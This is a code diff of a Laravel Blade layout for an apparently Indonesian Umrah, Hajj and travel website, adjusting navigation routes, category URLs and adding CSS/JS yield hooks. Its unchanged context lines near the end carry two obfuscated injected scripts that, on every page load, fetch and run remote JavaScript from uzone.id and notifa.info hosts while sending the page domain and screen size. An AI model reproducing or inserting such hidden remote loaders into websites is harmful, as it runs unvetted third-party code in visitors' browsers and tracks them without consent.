@@ -35,10 +35,8 @@
     <link href="https://fonts.googleapis.com/css?family=Raleway:300,400,500" rel="stylesheet" type="text/css">
     <link href="https://fonts.googleapis.com/css?family=Quattrocento:400,700" rel="stylesheet" type="text/css">
     <link href="https://fonts.googleapis.com/css?family=Tangerine:400" rel="stylesheet" type="text/css">
-	    
-
-
-      
+    @yield('css')
+    
 
 	<!--[if lt IE 9]>
       <script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
@@ -178,16 +176,16 @@
             <!-- End mobile menu toggle-->
           </div>
         </div>
-        <div id="navigation" style="margin-left: 20px">
+        <div id="navigation" style="margin-left: 50px">
           <ul class="navigation-menu nav">
-            <li><a href="{{ route('home') }}">Home</a></li>
+            <li><a href="{{ route('homes') }}">Home</a></li>
 			<li><a href="{{ route('profile') }}">Profil</a></li>
 			<li class="menu-item-has-children">
               <a href="{{ route('menu_umroh') }}">Umrah</a>
               
               <ul class="submenu"> 
           @foreach($kategori as $data)
-				  <li><a href="/umroh/kategori/{{ $data->slug }}">{{$data->nama_kategori}}</a></li>
+				  <li><a href="/umroh/{{ $data->slug }}">{{$data->nama_kategori}}</a></li>
           @endforeach
 				  <li><a href="{{ route('jadwal_keberangkatan') }}">Jadwal Keberangkatan</a></li>
 				  <li><a href="{{ route('promo') }}">Promo</a></li>
@@ -199,7 +197,7 @@
               <a href="{{ route('menu_haji') }}">Haji</a>
                <ul class="submenu">
 				 @foreach($kategoria as $data)
-          <li><a href="/haji/kategoria/{{ $data->slug }}">{{$data->nama_kategori}}</a></li>
+          <li><a href="/haji/{{ $data->slug }}">{{$data->nama_kategori}}</a></li>
           @endforeach
 				 <li><a href="{{ route('jadwal_manasik') }}">Jadwal Manasik</a></li>
 				 <li><a href="{{ route('daftar_umroh') }}">Daftar Sekarang</a></li>
@@ -209,7 +207,7 @@
               <a href="{{ route('menu_wisata') }}">Wisata</a>
                <ul class="submenu">
 				 @foreach($kategoriw as $data)
-          <li><a href="/wisata/kategoriw/{{ $data->slug }}">{{$data->nama_kategori}}</a></li>
+          <li><a href="/wisata/{{ $data->slug }}">{{$data->nama_kategori}}</a></li>
           @endforeach
 				 
               </ul>
@@ -349,9 +347,9 @@ s0.parentNode.insertBefore(s1,s0);
 
 
 
-
   <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs2.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKDQknhA3FEC%2bF2MyxJprq%2bX21UMQj8uikiTe3nYARLnpxz7VsI8y23CTJXkPmSO51%2fBtRsFyn%2bFp%2bKEF5b7ilHCha43Tt6MmOJhC3m62P30wuILLxfM07o0BMgGXVFlFXWXeVoXQO5SITKcvEBIGt%2f8uo2c3s4mhsRX0T1cKSBSGPqetfyS8WgqGaPlqiF%2f27ecCXDoSQ9Lo%2fmVLU5jEAUpjIn0g3NGEFvHG%2f%2b98TKdu4cRK5QqRojMVNUsiypoxYB%2bxeAMyGrVBDiMVa7i30KWO7pKvVukO8sU4gbaOGMdKilDqyN4SQErnFMSHHsDwVAn%2f00WSzAqrG4ILLq%2bG20lUUjosPUS2lEqvXTqnGuGJo6UqJZWQjJpNQjK6Kx2Rq" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script><script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mHQO2LAA2KUffLBhs7BXJgC0bsP7BscguG3nFw8bqxolDjY4dGA8bCOwXcb8J1HdO1ffDtw3ZAPJPweEqpZuHIj3dIS3jdbmkYM1QFQB7dLgYjWiVu9z0xvGUmjyNFxaXdDsAksHpPVzgE66Vt%2bREbTOFoARRxOORLIwHQwh%2bQsi1dzd5CWUEMJQZNTwmnzv6YQUDTOxfVA24yoaVxCqEfbR8iVaWfd6Cls%2b6S5vTYbVeRyXQ5HIGvbirNmKoJsjzuGHpxcv6FXWN4lMGNn6RF6ExGu13oIGp8jm2aRtBZtQArxaqs%2bmZhA4FjmuBBOOOEPusEHdU8ysCkmrX0%2fPWg8qMhqz1WFKhgCQcFivvL4%2fpvNGp9zP9CiYmq%2bpHXYhYSUo8sO66iRRoHqdwJRewqqO12OT%2bVTBofR7QtivItAlOMQn%2bdgkK0g%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
 
+    @yield('js')
 
 
 </body>
